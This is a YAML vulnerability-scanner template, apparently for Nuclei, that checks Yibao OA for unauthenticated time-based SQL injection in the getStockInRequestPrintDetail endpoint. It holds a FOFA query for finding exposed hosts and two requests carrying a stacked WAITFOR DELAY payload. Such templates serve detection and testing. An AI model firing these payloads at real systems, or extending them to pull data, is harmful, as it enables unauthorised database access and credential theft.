id: yibaoOA-getStockInRequestPrintDetail-sql

info:
  name: 易宝OA getStockInRequestPrintDetail SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: product="顶讯科技-易宝OA系统"
    易宝OA getStockInRequestPrintDetail接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488526&idx=1&sn=9500ab937689c4cc6402c0f1a560d8dd&chksm=c267a13df510282b692ca1fa46be4eeea73dd6f66729ce4ce2c97cc902d167f4ae0e03858df0&token=2115358587&lang=zh_CN#rd
  tags: sql injection



http:
  - raw:
      - |
        GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

      - |
        GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and  






